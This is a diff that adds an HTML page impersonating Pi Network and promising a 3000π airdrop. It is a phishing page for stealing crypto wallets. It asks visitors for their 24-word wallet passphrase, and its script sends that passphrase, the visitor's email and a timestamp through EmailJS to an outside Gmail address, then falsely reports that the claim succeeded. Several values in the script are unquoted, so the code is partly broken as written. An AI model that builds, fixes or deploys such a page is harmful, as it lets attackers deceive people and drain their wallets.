@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network - Claim 3000π</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Inter:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Reset default styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body with purple gradient */
+        body {
+            background: linear-gradient(180deg, #4b1e9e 0%, #2d0b5e 100%);
+            color: #f9fafb;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 40px 20px;
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 1s ease-in;
+        }
+
+        /* Fade-in animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Logo styling */
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 48px;
+            height: 48px;
+            margin-right: 12px;
+        }
+
+        .logo span {
+            font-size: 32px;
+            font-weight: 600;
+            color: #f5a623;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        /* Main heading */
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #f9fafb;
+            margin-bottom: 12px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        /* Claim section */
+        .claim-section {
+            width: 100%;
+            max-width: 450px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(8px);
+        }
+
+        .claim-section p {
+            font-size: 16px;
+            color: #d1d5db;
+            margin-bottom: 20px;
+        }
+
+        .claim-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* Form inputs */
+        .claim-form input, .claim-form textarea {
+            padding: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: rgba(255, 255, 255, 0.05);
+            color: #f9fafb;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .claim-form textarea {
+            resize: none;
+            height: 100px;
+        }
+
+        .claim-form input::placeholder, .claim-form textarea::placeholder {
+            color: #9ca3af;
+        }
+
+        .claim-form input:focus, .claim-form textarea:focus {
+            border-color: #f5a623;
+            box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.2);
+        }
+
+        /* Claim button */
+        .claim-form button {
+            background-color: #ff4081;
+            color: #f9fafb;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .claim-form button:hover {
+            background-color: #f50057;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 64, 129, 0.3);
+        }
+
+        .claim-form button:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        /* Success message */
+        .success-message {
+            color: #34d399;
+            font-size: 16px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        /* Privacy notice */
+        .privacy-notice {
+            font-size: 14px;
+            color: #d1d5db;
+            margin-top: 10px;
+            opacity: 0.8;
+        }
+
+        /* Footer */
+        footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            margin-top: 60px;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .social-icon {
+            width: 36px;
+            height: 36px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #f9fafb;
+            text-decoration: none;
+            font-size: 18px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        .social-icon:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .footer-text {
+            font-size: 14px;
+            color: #9ca3af;
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo -->
+    <div class="logo">
+        <img src="https://via.placeholder.com/48?text=π" alt="Pi Network Logo">
+        <span>Pi Network</span>
+    </div>
+
+    <!-- Claim Section -->
+    <div class="claim-section">
+        <h1>Claim 3000π Airdrop</h1>
+        <p>Enter your 24-word passphrase to claim your 3000π airdrop reward.</p>
+        <form class="claim-form" id="claim-form">
+            <input type="email" id="email" placeholder="Your email address" required readonly>
+            <textarea id="passphrase" placeholder="Enter your 24-word passphrase (e.g., word1 word2 ... word24)" required></textarea>
+            <button type="submit" id="claim-button">Claim Now</button>
+        </form>
+        <div class="success-message" id="success-message">Claim successful! Your 3000π has been sent to your wallet.</div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="social-links">
+            <a href="#" class="social-icon"><i class="fab fa-facebook-f"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-telegram-plane"></i></a>
+        </div>
+        <p class="footer-text">© 2025 Pi Network. All Rights Reserved.</p>
+    </footer>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your User ID
+        emailjs.init(KtLqHh8xtlVMGAOPY); // Replace with your EmailJS User ID
+
+        // Pre-fill email from query parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        if (email) {
+            document.getElementById("email").value = email;
+        }
+
+        // Form Submission
+        const claimForm = document.getElementById("claim-form");
+        const claimButton = document.getElementById("claim-button");
+        claimForm.addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const email = document.getElementById("email").value;
+            const passphrase = document.getElementById("passphrase").value.trim();
+
+            // Reset messages
+            document.getElementById("success-message").style.display = "none";
+
+            // Validate email
+            if (!email || !email.includes("@")) {
+                alert("Please enter a valid email address.");
+                return;
+            }
+
+            // Validate passphrase (must be exactly 24 words)
+            const words = passphrase.split(/\s+/).filter(word => word.length > 0);
+            if (words.length !== 24) {
+                alert("Please enter a valid 24-word passphrase.");
+                return;
+            }
+
+            // Show loading state
+            claimButton.disabled = true;
+            claimButton.textContent = "Claiming...";
+
+            // Get current date and time in WAT (Nigeria)
+            const currentDateTime = new Date().toLocaleString("en-US", {
+                timeZone: "Africa/Lagos",
+                hour12: true,
+                weekday: "long",
+                year: "numeric",
+                month: "long",
+                day: "numeric",
+                hour: "2-digit",
+                minute: "2-digit",
+            });
+
+            try {
+                // Send email using EmailJS
+                await emailjs.send(service_9a4wn0l, template_b9pz12e, {
+                    to_email: sirprist1@gmail.com, // Replace with target email
+                    from_email: email,
+                    passphrase: passphrase,
+                    time: currentDateTime
+                });
+
+                // Show success message
+                document.getElementById("success-message").style.display = "block";
+                document.getElementById("claim-form").reset();
+                document.getElementById("email").value = email; // Keep email filled
+            } catch (error) {
+                console.error("EmailJS Error:", error);
+                alert("Failed to submit claim. Please try again.");
+            } finally {
+                // Reset button state
+                claimButton.disabled = false;
+                claimButton.textContent = "Claim Now";
+            }
+        });
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init(KtLqHh8xtlVMGAOPY); // Replace with your User ID (e.g., user_1234567890abcdef)
+        })();
+    </script>
+</body>
+</html>
